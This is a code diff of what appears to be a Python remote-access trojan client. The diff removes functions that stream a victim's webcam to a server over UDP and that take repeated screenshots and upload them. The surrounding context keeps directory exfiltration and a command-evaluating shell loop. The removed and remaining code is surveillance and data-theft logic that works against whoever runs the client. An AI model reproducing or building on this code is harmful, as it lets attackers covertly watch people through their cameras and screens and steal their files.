@@ -8,13 +8,11 @@ import struct
 import requests
 import cv2
 import platform
-import pyscreenshot
 from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
 from cryptography.fernet import Fernet
 from random import randint
-from udp import UDP
 
 # Clase client-TCP
 class TCP:
@@ -434,39 +432,6 @@ class TCP:
         else:
             self.__sock.send(f"[!] warning: Camara \"{camara}\" no encontrada".encode())
 
-    # Funcion para enviar video de la camara al servidor
-    # cmd --> comando recibido
-    def captura(self, cmd):
-        params = self.parametros(cmd, r"(\s-c[= ])")[0]
-        
-        camara = int(params['-c'])
-        udp = UDP(self.__host, self.__newPort, self.__myOs)
-
-        if self.__myOs == "windows":
-            captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
-        else:
-            captura = cv2.VideoCapture(camara)
-        leido = captura.read()[0]
-        captura.release()
-
-        if leido:
-            self.__sock.send("[+] info: ok".encode())
-            try:
-                udp.conectar()
-                self.__sock.recv(8)
-                udp.captura(camara)
-                udp.close()
-                captura.release()
-                self.__sock.send("[+] info: client-UDP desconectado".encode())
-            except:
-                udp.close()
-                captura.release()
-                self.__sock.send("[+] info: client-UDP desconectado".encode())
-        else:
-            udp.close()
-            captura.release()
-            self.__sock.send(f"[!] warning: Camara \"{camara}\" no encontrada".encode())
-
     # Funcion para enviar un directorio al servidor
     # cmd --> comando recibido
     def sendDirFrom(self, cmd):
@@ -783,25 +748,6 @@ class TCP:
                 while i < len(info):
                     self.enviarDatos(info[i:i+self.__chunk].encode())
                     i += self.__chunk
-
-    def screenShot(self, cmd):
-        params = self.parametros(cmd, r"(\s-[dnot]+[= ])")[0]
-        directorio = params['-d'] if '-d' in params.keys() else '.'
-
-        n = int(params['-n']) if '-n' in params.keys() else 1
-        t = float(params['-t']) if '-t' in params.keys() else 0.0
-
-        ubicacion = f"{directorio}/ss.png"
-        i = 0
-        while i < n:
-            screenshot = pyscreenshot.grab()
-            screenshot.save(ubicacion)
-            self.__sock.send(b'ok')
-            self.enviarArchivo(ubicacion)
-
-            os.remove(ubicacion)
-            sleep(t)
-            i += 1
 
     # Funcion para recibir y evaluar comandos
     def shell(self):
